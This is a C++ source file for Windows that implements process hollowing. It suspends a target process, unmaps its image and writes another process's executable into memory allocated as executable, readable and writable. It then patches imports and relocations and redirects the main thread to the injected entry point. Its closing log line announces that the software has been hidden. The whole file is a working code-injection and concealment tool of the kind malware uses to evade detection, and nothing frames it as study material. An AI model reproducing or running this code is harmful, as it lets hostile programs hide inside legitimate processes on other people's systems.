#include <iostream>
#include <vector>

#include <Windows.h>
#include <TlHelp32.h>

namespace process {

    // Typedefs

    // Used in function casting with ntdll functions.
    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
    typedef NTSTATUS(NTAPI* pNtSuspendProcess)(HANDLE ProcessHandle);
    typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE ProcessHandle);

    // Structs

    // Compacted PBI struct as we only want PebBaseAddress.
    // Full struct also contains useful things such as NTSTATUS ExitStatus in place of Reserved1,
    //                                              or KPRIORITY BasePriority for Reserved2[1].
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PVOID PebBaseAddress;
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } PROCESS_BASIC_INFORMATION;

    // RAII Wrapper that closes any handle as soon as it goes out of scope.
    struct HandleCloser {
        void operator()(HANDLE h) const {
            if (h && h != INVALID_HANDLE_VALUE)
                CloseHandle(h);
        }
    };
    using unique_handle = std::unique_ptr<std::remove_pointer<HANDLE>::type, HandleCloser>;

    // Forward declaration of a needed function.
    LPVOID get_process_base_address(HANDLE process_handle);

    // Get the process id of a process of name process_name.
    DWORD get_process_id(const std::wstring& process_name)
    {
        DWORD process_id{}; // Default

        // Create a snapshot of all open processes.
        HANDLE snap_shot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
        if (snap_shot == INVALID_HANDLE_VALUE) // If the snapshot is invalid, return early.
            return process_id;

        // Store process information of snapshot.
        PROCESSENTRY32W entry;
        entry.dwSize = sizeof(decltype(entry));

        if (Process32FirstW(snap_shot, &entry) == TRUE) // First process in snapshot.
        {
            // Iterate all processes in the snapshot.
            do
            {
                // Check if the process name matches the query.
                if (_wcsicmp(process_name.c_str(), entry.szExeFile) == 0)
                {
                    process_id = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snap_shot, &entry) == TRUE); // Continue the loop whilst criteria not met.
        }

        // Close the handle before exiting.
        CloseHandle(snap_shot);
        return process_id;
    }

    // Helper to get a handle to a process via process id.
    HANDLE open_process(DWORD process_id, DWORD access_rights)
    {
        // Try to open a handle using the given process id, and access rights.
        HANDLE process = OpenProcess(access_rights, FALSE, process_id);
        return process;
    }

    // Function to suspend a running process.
    bool suspend_process(HANDLE process_handle)
    {
        // Get ntdll
        HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
        if (!ntdll) return false;

        // Get function NtSuspendProcess from ntdll
        pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
        if (!NtSuspendProcess) return false;

        // Suspend the process
        NTSTATUS suspend_status = NtSuspendProcess(process_handle);
        return suspend_status == 0;
    }

    // Function to resume a suspended process.
    bool resume_process(HANDLE process_handle)
    {
        // Get ntdll
        HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
        if (!ntdll) return false;

        // Get function NtResumeProcess from ntdll
        pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess");
        if (!NtResumeProcess) return false;

        // Resume the function
        NTSTATUS resume_status = NtResumeProcess(process_handle);
        return resume_status == 0;
    }

    // Unmap process memory function.
    bool unmap_process_memory(HANDLE process_handle)
    {
        // Get ntdll
        HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
        if (!ntdll) return false;

        // Get function NtUnmapViewOfSection from ntdll
        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        if (!NtUnmapViewOfSection) return false;

        // Get the base address of the process to use with NtUnmapViewOfSection
        LPVOID base_address = get_process_base_address(process_handle);

        // Unmap the section
        NTSTATUS unmap_status = NtUnmapViewOfSection(process_handle, base_address);
        return unmap_status == 0;
    }

    // Allocate memory remotely.
    LPVOID allocate_remote_memory(HANDLE process_handle, SIZE_T size, DWORD protect)
    {
        return VirtualAllocEx(process_handle, NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
    }

    bool write_remote_memory(HANDLE process_handle, LPVOID lp_address, LPVOID lp_buffer, SIZE_T size)
    {
        SIZE_T bytes_written{};
        bool success = WriteProcessMemory(process_handle, lp_address, lp_buffer, size, &bytes_written);

        return success && bytes_written == size;
    }

    LPVOID get_process_base_address(HANDLE process_handle)
    {
        // Get ntdll.
        HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
        if (!ntdll) return nullptr;

        // Get function NtQueryInformation from ntdll.
        pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
        if (!NtQueryInformationProcess) return nullptr;

        // Declare a struct to hold the data from NtQueryInformationProcess.
        PROCESS_BASIC_INFORMATION pbi{};

        // Populate the PROCESS_BASIC_INFORMATION "pbi" struct.
        NTSTATUS query_status = NtQueryInformationProcess(process_handle, 0, &pbi, sizeof(pbi), NULL);
        if (query_status != 0) return nullptr;

        // Declare holder variables for the ImageBaseAddress.
        LPVOID base_address{ nullptr };
        SIZE_T bytes_read{ 0 };

        // Grab the ImageBaseAddress from the PEB pointer's base address + ImageBaseAddress offset.
        bool read_success = ReadProcessMemory(process_handle, (BYTE*)pbi.PebBaseAddress + 0x10, &base_address, sizeof(PVOID), &bytes_read);
        if (!read_success) return nullptr;

        return base_address;
    }

    bool read_pe_from_process(HANDLE process_handle, LPVOID lp_base_address, std::vector<BYTE>& buffer)
    {
        IMAGE_DOS_HEADER dos_header;
        SIZE_T bytes_read{ 0 };

        // Grab DOS Header from lp_base_address as we need e_lfanew to locate NT headers.
        bool read_success = ReadProcessMemory(
            process_handle,
            lp_base_address,
            &dos_header,
            sizeof(IMAGE_DOS_HEADER),
            &bytes_read
        );

        if (!read_success || dos_header.e_magic != IMAGE_DOS_SIGNATURE) return false;

        IMAGE_NT_HEADERS nt_headers;

        // Grab NT Headers from the offset lp_base_address + dos_header.e_lfanew.
        read_success = ReadProcessMemory(
            process_handle,
            (BYTE*)lp_base_address + dos_header.e_lfanew,
            &nt_headers,
            sizeof(IMAGE_NT_HEADERS),
            &bytes_read
        );

        if (!read_success || nt_headers.Signature != IMAGE_NT_SIGNATURE) return false;

        // SizeOfImage is the full size of the PE, including all sections.
        DWORD size_of_image = nt_headers.OptionalHeader.SizeOfImage;

        if (size_of_image == 0) return false;

        // Resize the buffer to fit the bytes in the size of the image.
        buffer.resize(size_of_image);

        // Read the PE image into the buffer.
        read_success = ReadProcessMemory(
            process_handle,
            lp_base_address,
            buffer.data(),
            size_of_image,
            &bytes_read
        );

        return read_success;
    }

    // Helper to get NT headers using a LPV base address.
    PIMAGE_NT_HEADERS get_nt_headers(LPVOID address)
    {
        PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(address);
        if (dos_header == nullptr || dos_header->e_magic != IMAGE_DOS_SIGNATURE) return nullptr; // Check for "MZ"

        PIMAGE_NT_HEADERS nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>((long long)address + dos_header->e_lfanew);
        if (nt_headers == nullptr || nt_headers->Signature != IMAGE_NT_SIGNATURE) return nullptr; // Check for "PE\0\0"

        return nt_headers;
    }

    bool write_pe_sections(HANDLE process_handle, LPVOID base_address, LPVOID pe_buffer)
    {
        // Get nt headers from the executable buffer.
        PIMAGE_NT_HEADERS nt_headers = get_nt_headers(pe_buffer);
        if (!nt_headers) return false;

        PIMAGE_SECTION_HEADER image_sections = IMAGE_FIRST_SECTION(nt_headers);
        WORD num_sections = nt_headers->FileHeader.NumberOfSections;

        if (!write_remote_memory(process_handle, base_address, pe_buffer, nt_headers->OptionalHeader.SizeOfHeaders))
            return false;

        // Loop through each hider section and write them to the host process.
        for (DWORD i{}; i < num_sections; i++)
        {
            PIMAGE_SECTION_HEADER section = &image_sections[i];
            LPVOID destination = (BYTE*)base_address + section->VirtualAddress;
            LPVOID source = (BYTE*)pe_buffer + section->PointerToRawData;
            DWORD size = section->SizeOfRawData;

            if (!write_remote_memory(process_handle, destination, source, size))
                return false;
        }

        return true;
    }

    // Patches all addresses in the pe_buffer so they match base_address blocks.
    bool fix_relocations(LPVOID base_address, LPVOID pe_buffer)
    {
        PIMAGE_NT_HEADERS nt_headers = get_nt_headers(pe_buffer);
        if (!nt_headers) return false;

        // Delta contains the difference between the two addresses, from base_address and pe_buffer.
        ULONGLONG delta = (ULONGLONG)base_address - nt_headers->OptionalHeader.ImageBase;
        if (delta == 0) return true; // Everything matches, no relocations needed.

        IMAGE_DATA_DIRECTORY reloc_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir.Size == 0) return true; // No relocation table, PE has no fixups.

        // Loop for all blocks, each block is 4KB, and contains a list of offsets within the page to patch.
        for (
            PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)((BYTE*)pe_buffer + reloc_dir.VirtualAddress); // Start
            (BYTE*)block < (BYTE*)pe_buffer + reloc_dir.VirtualAddress + reloc_dir.Size && block->SizeOfBlock > 0; // End Condition
            block = (PIMAGE_BASE_RELOCATION)((BYTE*)block + block->SizeOfBlock) // Incrementor
            ) {

            // Inner loop for all sections within the block.
            DWORD num_entries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (DWORD i{}; i < num_entries; i++)
            {
                WORD entry = ((WORD*)(block + 1))[i];
                WORD type = entry >> 12; // Upper 4 bits contain reloaction type.
                WORD offset = entry & 0xFFF; // Lower 12 bits are the offset contained in the page.

                if (type != IMAGE_REL_BASED_DIR64) continue; // Only fix 64bit absolute addresses.

                // Add delta to the absolute address of this location in the local buffer.
                ULONGLONG* patch = (ULONGLONG*)((BYTE*)pe_buffer + block->VirtualAddress + offset);
                *patch += delta;
            }
        }

        return true;
    }

    // Fix imports of pe_buffer, by importing missing DLLs and function addresses.
    // The IAT in the copyd PEI still contains addresses from the original process,
    //      so we must resolve each imported function and
    //      write the correct addr into the buffer before it gets written to the remote process.
    bool fix_imports(LPVOID pe_buffer)
    {
        PIMAGE_NT_HEADERS nt_headers = get_nt_headers(pe_buffer);
        if (!nt_headers) return false;

        // Try to grab the import directory.
        IMAGE_DATA_DIRECTORY import_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (import_dir.Size == 0) return true; // No imports

        // Each description representes one imported DLL.
        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pe_buffer + import_dir.VirtualAddress);

        // Iterate for each imported DLL
        while (import_desc->Name != 0)
        {
            const char* dll_name = (const char*)((BYTE*)pe_buffer + import_desc->Name);

            // Load the DLL here so we can resolve function addresses from it.
            HMODULE dll = LoadLibraryA(dll_name);
            if (!dll)
            {
                std::cout << "[-] Skipping DLL (could not load): " << dll_name << "\n";
                import_desc++;
                continue; // Skip this DLL
            }

            // FirstThunk is the IAT, which is what we overwrite with resolved addresses.
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)pe_buffer + import_desc->FirstThunk);

            // OriginalFirstThunk is the INT, which is used to look up the function names.
            PIMAGE_THUNK_DATA orig_thunk = import_desc->OriginalFirstThunk
                ? (PIMAGE_THUNK_DATA)((BYTE*)pe_buffer + import_desc->OriginalFirstThunk)
                : thunk;

            while (orig_thunk->u1.AddressOfData != 0)
            {
                FARPROC func_addr = nullptr;

                if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal))
                {
                    // Import using ordinal
                    func_addr = GetProcAddress(dll, MAKEINTRESOURCEA(IMAGE_ORDINAL(orig_thunk->u1.Ordinal)));
                }
                else
                {
                    // Import using name
                    PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pe_buffer + orig_thunk->u1.AddressOfData);
                    func_addr = GetProcAddress(dll, import_by_name->Name);
                }

                if (!func_addr)
                {
                    std::cout << "[-] Skipping unresolved function in: " << dll_name << "\n";
                    thunk++;
                    orig_thunk++;
                    continue;
                }

                // Write resolved address into the IAT in the buffer
                thunk->u1.Function = (ULONGLONG)func_addr;

                thunk++;
                orig_thunk++;
            }

            import_desc++;
        }

        return true;
    }

    // Function helper to set the thread context of a thread to an entry point.
    bool set_thread_context(HANDLE thread, LPVOID entry_point)
    {
        if (SuspendThread(thread) == (DWORD)-1)  // Suspend to re-set target context.
            return false;

        // Create and set the context flags.
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_CONTROL;

        // If we can't get the context, resume the thread, and cancel.
        if (!GetThreadContext(thread, &ctx))
        {
            ResumeThread(thread);
            return false;
        }

        ctx.Rip = (ULONGLONG)entry_point;

        // If we failed to set the context, again, resume and cancel.
        if (!SetThreadContext(thread, &ctx))
        {
            ResumeThread(thread);
            return false;
        }

        // Resume the thread since we set the context successfully.
        ResumeThread(thread);
        return true;
    }

    // Returns the main thread as a handle from a process id.
    HANDLE get_main_thread(DWORD process_id)
    {
        HANDLE thread_handle = NULL;

        unique_handle snap_shot(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)); // Snapshot all running threads in the system.
        if (snap_shot.get() == INVALID_HANDLE_VALUE) return nullptr;

        // Initialize a THREADENTRY32 struct to hold the needed values´.
        THREADENTRY32 thread_entry = {};
        thread_entry.dwSize = sizeof(THREADENTRY32);

        if (!Thread32First(snap_shot.get(), &thread_entry)) return nullptr;

        do
        {
            // Skip threads that don't belong to the target process.
            if (thread_entry.th32OwnerProcessID != process_id) continue;

            // Open the first thread with the rights we need for the rest of the software.
            //      the first thread typically is the main thread.
            thread_handle = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_entry.th32ThreadID);

            break; // Exit
        } while (Thread32Next(snap_shot.get(), &thread_entry));

        return thread_handle;
    }

    // Hollows out host_process_id and replaces its memory with the executables'
    // image from hider_process_id. On success, the host process is resumed,
    // running with the hiders' code inside of it.
    bool hollow_process(DWORD host_process_id, DWORD hider_process_id)
    {
        // Forward declaration of variables, as required by the compiler with use of goto...
        HANDLE host_handle = open_process(host_process_id, PROCESS_ALL_ACCESS);
        HANDLE hider_handle = open_process(hider_process_id, PROCESS_ALL_ACCESS);
        HANDLE host_thread = NULL;

        LPVOID remote_allocated_memory;
        LPVOID hider_process_base;

        PIMAGE_NT_HEADERS nt_headers;

        bool suspended = false;
        bool success = false;

        std::vector<BYTE> portable_executable_buffer;

        if (host_handle == NULL || hider_handle == NULL) return false;

        // Suspend the process so we can modify it's internal contents.
        if (!suspend_process(host_handle))
            goto cleanup;

        std::cout << "[+] Suspended the host process.\n";

        suspended = true;
        hider_process_base = get_process_base_address(hider_handle);

        // Read the portable executable's contents from the process hider_handle into portable_executable_buffer.
        if (!read_pe_from_process(hider_handle, hider_process_base, portable_executable_buffer))
            goto cleanup;

        std::cout << "[+] Read the executables' content from the hider.\n";

        // Get the nt headers using the PE buffer's data.
        nt_headers = get_nt_headers(portable_executable_buffer.data());
        if (!nt_headers)
            goto cleanup;

        std::cout << "[+] Got the NT Headers from the executable.\n";

        if (!unmap_process_memory(host_handle))
            goto cleanup;

        std::cout << "[+] Unmapped the process memory of the host.\n";

        // Allocate memory remotely inside host_handle with the size of the nt headers imagesize.
        remote_allocated_memory = allocate_remote_memory(host_handle, nt_headers->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE);
        if (remote_allocated_memory == nullptr)
            goto cleanup;

        std::cout << "[+] Allocated memory of size SizeOfImage to host.\n";

        // Fix the imports of the PEB
        if (!fix_imports(portable_executable_buffer.data()))
            goto cleanup;

        std::cout << "[+] Fixed imports.\n";

        if (!fix_relocations(remote_allocated_memory, portable_executable_buffer.data()))
            goto cleanup;

        std::cout << "[+] Fixed the relocations for the host.\n";

        // Write the PE sections, and fix the relocations of the PE.
        if (!write_pe_sections(host_handle, remote_allocated_memory, portable_executable_buffer.data()))
            goto cleanup;

        std::cout << "[+] Wrote the executables' content to the remote allocated memory.\n";

        host_thread = get_main_thread(host_process_id);
        if (host_thread == NULL)
            goto cleanup;

        // Set the main thread context of host_thread.
        if (!set_thread_context(host_thread, (BYTE*)remote_allocated_memory + nt_headers->OptionalHeader.AddressOfEntryPoint))
            goto cleanup;

        std::cout << "[+] Set the thread context of the host.\n";

        // Finally resume the process, and to cleanup.
        if (!resume_process(host_handle)) goto cleanup;

        std::cout << "[+] Resumed the host.\n";

        suspended = false;
        success = true;

    // Used with goto cleanup to close any open handles, and log output.
    cleanup:
        if (!success)
        {
            std::cout << "[-] Hollow process failed.\n" << std::flush;
            std::cin.get();
        }
        else
        {
            std::cout << "[+] Successfully hollowed the process, and hid the software!\n" << std::flush;
            std::cin.get();
        }
        // Close handles and finalize cleanup before exiting.
        if (suspended && !success) resume_process(host_handle);
        if (host_handle) CloseHandle(host_handle);
        if (hider_handle) CloseHandle(hider_handle);
        if (host_thread) CloseHandle(host_thread);

        return success;
    }
}